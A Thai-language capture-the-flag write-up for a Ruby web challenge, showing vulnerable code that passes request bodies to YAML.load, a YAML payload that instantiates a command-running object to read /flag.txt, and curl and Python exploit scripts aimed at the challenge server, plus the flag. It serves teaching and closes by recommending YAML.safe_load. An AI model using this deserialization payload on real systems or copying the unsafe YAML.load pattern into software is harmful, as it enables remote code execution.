# Magic Ruby (Web, 100pts)

**Flag:** `DELTA{ruby_yaml_d3s3r14l1z4t1on_rce_magic}`

## โจทย์

Web app สร้างด้วย Ruby รับข้อมูล YAML — ทำให้ server รันคำสั่งตามที่ต้องการ

## ขั้นตอน

### 1. Source Code

```ruby
class CommandTask
  def initialize(command)
    @command = command
  end
  def execute
    system(@command)
  end
end

data = YAML.load(request.body.read)  # ⚠️ VULNERABLE!
```

`YAML.load()` สามารถ instantiate object ใดๆ รวมถึง `CommandTask` ที่มี `system()`

### 2. YAML Payload

```yaml
--- !ruby/object:CommandTask
command: cat /flag.txt
```

### 3. ส่ง

```bash
curl -X POST http://13.238.150.105:32590/ \
  --data '--- !ruby/object:CommandTask
command: cat /flag.txt'
```

## หลักการ

YAML Deserialization คล้ายกับ:
- `pickle.load()` ใน Python
- `readObject()` ใน Java
- `unserialize()` ใน PHP

`YAML.load()` (unsafe) vs `YAML.safe_load()` (safe)

## Exploit

```python
import requests

payload = """--- !ruby/object:CommandTask
command: cat /flag.txt"""

r = requests.post("http://13.238.150.105:32590/", data=payload)
print(r.text)
```

## สรุป

- `YAML.load()` unsafe → ใช้ `YAML.safe_load()` เสมอ
- Deserialization RCE มีในหลายภาษา
- ถ้าเห็น YAML/Marshal/pickle ใน CTF → deserialization attack
